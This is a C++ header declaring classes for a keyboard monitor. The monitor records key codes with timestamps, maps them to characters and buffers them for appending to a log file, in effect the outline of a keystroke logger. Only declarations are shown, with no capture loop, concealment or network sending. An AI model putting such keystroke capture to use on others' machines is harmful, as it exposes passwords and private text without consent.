#pragma once

#include <iomanip>
#include <list>
#include <process.h>
#include <sstream>
#include <stdio.h>

#include "BaseEvent.h"
#include "Monitor.h"

#define KEY_CURRENTLY_PRESSED_MASK (1 << 15)
#define KEY_PRESSED_SINCE_LAST_CALL 1

#define DEFAULT_MAX_LIST_SIZE 20

class KeyboardEvent : public BaseEvent
{
public:
	KeyboardEvent(short virtualKeyCode);
	KeyboardEvent(const KeyboardEvent& other);
	~KeyboardEvent(void) {};

	char getCharacter(void)
	{
		char character = MapVirtualKey(m_virtualKeyCode, MAPVK_VK_TO_CHAR);
		return character;
	}

	short getVirtualKeyCode(void)
	{
		return m_virtualKeyCode;
	}

	std::string getString(void);

#pragma region BaseEvent pverrides
public:
	virtual std::string toString(void)
	{
		std::ostringstream stream;
		stream << "[LocalTime: " << m_localTime.wYear << "/" << m_localTime.wMonth << "/" << m_localTime.wDay << " ";
		stream << m_localTime.wHour << ":" << m_localTime.wMinute << ":" << m_localTime.wSecond << ":" << m_localTime.wMilliseconds << "] ";
		stream << "[Keyboard Event] "<< " KeyCode: 0x" << std::hex << m_virtualKeyCode << " ";
		stream << "Character: " << getString();

		return stream.str();
	}
#pragma endregion

private:
	short m_virtualKeyCode;
};

class KeyboardMonitor : public Monitor
{
public:
	KeyboardMonitor(void);
	KeyboardMonitor(const std::string m_logFilePath);
	KeyboardMonitor(const std::string m_logFilePath, unsigned int maxListSize);
	~KeyboardMonitor(void);

#pragma region Monitor overrides
public:
	virtual void operator()();
#pragma endregion

private:
	bool appendToFile(void);

private:
	unsigned int m_maxListSize;

	std::list<KeyboardEvent> m_keyboardEventList;
};

